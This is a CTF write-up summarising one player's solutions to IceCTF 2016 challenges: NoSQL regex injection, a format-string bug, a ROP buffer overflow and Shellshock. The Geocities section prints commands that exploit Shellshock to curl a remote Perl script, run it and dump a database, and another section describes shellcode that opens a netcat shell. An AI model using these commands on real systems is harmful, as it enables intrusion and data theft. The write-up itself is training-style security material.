# IceCTF-2016-WriteUp
My solutions to some of the challenges in IceCTF 2016. I should mention that this was my first CTF evah...

## A Strong Feeling

The solution I implemented was based on bruteforcing the string character by character. A better solution would have been to script some automatic tool to find the correct input. Whatever.

## Chained In

This was a NoSQL Injection (is this name a thing?). The script does, once again, a bruteforce attack of the admin password (AKA the flag) in a character by character fashion. This is done by using a regex using the `$regex` operator of MongoDB.

## Dear Diary

String format vulnerability. Just pipe the output of the script into the CTF executable and you can see the flag (among other random stuff from memory).

Script: `dear_shit.py`

## Geocities

I exploited shellshock on `index.cgi` to download the simple DB dumper I wrote. Then I executed it and got the flag from the DB.

Usage:
```
geocities_shellshock.sh "curl http://blabla/dumper.pl > /tmp/fuck.pl"
geocities_shellshock.sh "chmod +x /tmp/fuck.pl"
geocities_shellshock.sh "/tmp/fuck.pl \"SHOW TABLES;\""
geocities_shellshock.sh "/tmp/fuck.pl \"SELECT * FROM 47a6fd2ca39d2b0d6eea1c30008dd889;\""
```

It was fun to see that a some people actually went beyond the scope of the CTF and left some "I was here" notes inside the source code of the website.

## So Close

**EDIT:** Apparently I missed that the ELF is non-PIE so I totally overcomplicated things :)

This was a buffer overflow in which we couldn't overwrite the return address of the function, so things got a bit more complicated. Since I'm a n00b and I didn't know any better, I ended up using a ROP gadget from libc in order to bypass ASLR (`call ecx`) and then tried to run the shellcode many times until I succeeded (kinda like... bruteforcing). If you solved it in a sane way please drop me a line.

I rewrote the script I used in order to make it totally automatic... it is now too verbose but I think it's pretty clear what it does:

1. Overwrite a single byte of the value that `ebp` is gonna take at the end of the vulnerable function
2. Put the shellcode in the buffer
3. Fill the rest of the buffer with the address of my `call ecx` gadget
4. Wait for the magic to happen (AKA getting `libc`'s address right)
5. ...
6. PROFIT!

My shellcode lanched the shellscript `./bb` which in turn runs netcat and `/bin/sh`. It is created by the python exploit at runtime.

# Conclusion

The CTF was fun even though I didn't have much time to commit to it. Feel free to ask me any question or point me to better solutions if you want :)
